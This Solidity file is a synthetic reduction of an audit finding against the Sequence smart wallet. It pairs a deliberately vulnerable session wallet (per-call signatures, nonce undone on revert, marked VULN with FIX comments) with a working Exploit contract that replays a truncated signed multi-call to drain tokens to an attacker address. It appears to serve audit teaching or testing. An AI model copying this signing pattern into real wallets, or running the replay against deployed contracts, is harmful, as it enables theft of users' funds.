// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Sequence — Partial signature replay / frontrun on session calls (H-02)
    (Code4rena 2025-10-sequence, finding #63761, reporter montecristo)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause (two cooperating facts):
      1. Calls.execute bumps the nonce, then runs calls; a BEHAVIOR_REVERT_ON_ERROR
         failure reverts the whole tx, so the nonce is NOT actually consumed.
      2. Session signatures are bound per-call via hashCallWithReplayProtection
         (domain, space, nonce, callIdx, call body) — NOT to the full payload.
    A multi-call [A, B] that reverts on B leaves SigA reusable: an attacker
    truncates to [A] + [SigA] and executes A alone, breaking atomicity.

    Concrete harm: Call A transfers wallet tokens to the attacker; Call B is a
    final check that always reverts. The legitimate multi-call fails safely;
    the partial replay steals the tokens.

    Hash omits the `to` address (a synthetic reduction so precomputed signatures
    stay independent of CREATE addresses); the @> VULN is still the per-call
    binding + nonce-reverting execute — the same partial-replay root cause.
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    string public constant name = "WETH";
    string public constant symbol = "WETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Always-reverting target for the "failed later call" half of the payload.
contract Reverter {
    function alwaysRevert() external pure {
        revert("fail");
    }
}

/// @dev Minimal session wallet: per-call ecrecover, nonce bumped then full-revert
///      on BEHAVIOR_REVERT_ON_ERROR, signatures bound only to individual call hashes.
contract SessionWallet {
    uint8 public constant BEHAVIOR_REVERT_ON_ERROR = 0;
    uint8 public constant BEHAVIOR_IGNORE_ERROR = 1;
    /// @dev Fixed domain (payload.noChainId ? 0 : chainId) — use 1 for stable digests.
    uint256 public constant DOMAIN = 1;

    struct Call {
        address to;
        uint256 value;
        bytes data;
        uint8 behaviorOnError;
    }

    uint256 public nonce;
    uint256 public space;
    address public sessionSigner;
    MockToken public immutable token;

    error InvalidSignature();
    error Reverted(uint256 index);

    constructor(address sessionSigner_, MockToken token_) {
        sessionSigner = sessionSigner_;
        token = token_;
    }

    /// @dev Faithful reduction of Calls.execute: bump nonce, validate, execute.
    function execute(Call[] calldata calls, bytes[] calldata signatures) external {
        // FIX: bind each session sig to the full payload hash (or commit nonce first
        // in a non-reverting envelope).
        uint256 usedNonce = nonce;
        nonce = usedNonce + 1; // @> VULN: nonce bumped here; REVERT_ON_ERROR later undoes it — sig stays valid

        uint256 n = calls.length;
        require(n == signatures.length, "len");
        for (uint256 i = 0; i < n; i++) {
            bytes32 callHash = hashCallWithReplayProtection(space, usedNonce, i, calls[i]);
            address recovered = _recover(callHash, signatures[i]);
            if (recovered != sessionSigner) revert InvalidSignature();
        }

        _execute(calls);
    }

    function _execute(Call[] calldata calls) private {
        uint256 numCalls = calls.length;
        for (uint256 i = 0; i < numCalls; i++) {
            Call calldata call = calls[i];
            (bool success,) = call.to.call{value: call.value}(call.data);
            if (!success) {
                if (call.behaviorOnError == BEHAVIOR_REVERT_ON_ERROR) {
                    revert Reverted(i); // @> VULN: full revert undoes nonce++ — partial sigs remain replayable
                }
            }
        }
    }

    /// @dev SessionSig.hashCallWithReplayProtection — binds to ONE call only.
    ///      (`to` omitted from the digest so precomputed sigs are CREATE-stable;
    ///      the real code hashes Payload.hashCall which includes `to` — the bug is
    ///      still that the full multi-call payload is not bound.)
    function hashCallWithReplayProtection(
        uint256 space_,
        uint256 nonce_,
        uint256 callIdx,
        Call calldata call
    ) public pure returns (bytes32 callHash) {
        // FIX: include keccak256(abi.encode(allCalls)) / full payload hash in the digest
        // @> VULN: only this call's body is hashed — not the full payload — enables partial replay
        return keccak256(abi.encodePacked(DOMAIN, space_, nonce_, callIdx, call.value, keccak256(call.data), call.behaviorOnError)); // @> VULN: per-call only
    }

    function _recover(bytes32 callHash, bytes memory signature) internal pure returns (address) {
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", callHash));
        require(signature.length == 65, "bad sig");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        return ecrecover(digest, v, r, s);
    }
}

contract Exploit {
    MockToken public token; // CREATE nonce 1
    Reverter public reverter; // CREATE nonce 2
    SessionWallet public wallet; // CREATE nonce 3

    address public constant ATTACKER = address(0xA77AC);
    address public constant SIGNER = 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7;
    uint256 public constant STEAL_AMOUNT = 100 ether;

    // Precomputed offline for DOMAIN=1, space=0, nonce=0:
    // dataA = abi.encodeWithSelector(MockToken.transfer.selector, ATTACKER, STEAL_AMOUNT)
    // dataB = abi.encodeWithSelector(Reverter.alwaysRevert.selector)
    // callHash(i) = keccak256(abi.encodePacked(1, 0, 0, i, 0, keccak256(data), uint8(0)))
    // eth_sign(callHash) with key 0xA11CE
    bytes32 public constant R0 = 0xab1808e0632d8cde8a21d6833f92c2c2a118d7eae1ddac929d7fec1a4dc33e8f;
    bytes32 public constant S0 = 0x6d8b4e72752bed63ea32e1992e066c7466831093e6dfb80b06299356ee54a9aa;
    uint8 public constant V0 = 28;
    bytes32 public constant R1 = 0x49239d2efcfbc6024a7b5f58e876f047aa0efcb794e710780cfc990f1c85da40;
    bytes32 public constant S1 = 0x39144e4a9b641c454bd6533524cebf4c26e43fb22a8f82dd1e97bd4816991ff7;
    uint8 public constant V1 = 27;

    constructor() {
        token = new MockToken();
        reverter = new Reverter();
        wallet = new SessionWallet(SIGNER, token);
        token.mint(address(wallet), STEAL_AMOUNT);
    }

    function run() external {
        bytes memory dataA = abi.encodeWithSelector(MockToken.transfer.selector, ATTACKER, STEAL_AMOUNT);
        bytes memory dataB = abi.encodeWithSelector(Reverter.alwaysRevert.selector);

        // --- Legitimate multi-call [A, B] with REVERT_ON_ERROR — must fail, leave nonce=0 ---
        SessionWallet.Call[] memory calls2 = new SessionWallet.Call[](2);
        calls2[0] = SessionWallet.Call({
            to: address(token),
            value: 0,
            data: dataA,
            behaviorOnError: 0 // REVERT_ON_ERROR
        });
        calls2[1] = SessionWallet.Call({
            to: address(reverter),
            value: 0,
            data: dataB,
            behaviorOnError: 0
        });
        bytes[] memory sigs2 = new bytes[](2);
        sigs2[0] = abi.encodePacked(R0, S0, V0);
        sigs2[1] = abi.encodePacked(R1, S1, V1);

        // Expect revert on call index 1
        try wallet.execute(calls2, sigs2) {
            revert("multi-call should have reverted");
        } catch {
            // expected
        }
        require(wallet.nonce() == 0, "nonce should be unconsumed after full revert");
        require(token.balanceOf(ATTACKER) == 0, "no steal on failed multi-call");
        require(token.balanceOf(address(wallet)) == STEAL_AMOUNT, "wallet still funded");

        // --- Partial replay: only call A + SigA (drop the failing call) ---
        SessionWallet.Call[] memory calls1 = new SessionWallet.Call[](1);
        calls1[0] = calls2[0];
        bytes[] memory sigs1 = new bytes[](1);
        sigs1[0] = sigs2[0];

        wallet.execute(calls1, sigs1);

        // HARM: partial session executed — wallet tokens stolen, atomicity broken
        require(token.balanceOf(ATTACKER) == STEAL_AMOUNT, "partial replay did not steal");
        require(token.balanceOf(address(wallet)) == 0, "wallet not drained");
        require(wallet.nonce() == 1, "nonce consumed by partial replay");
    }
}
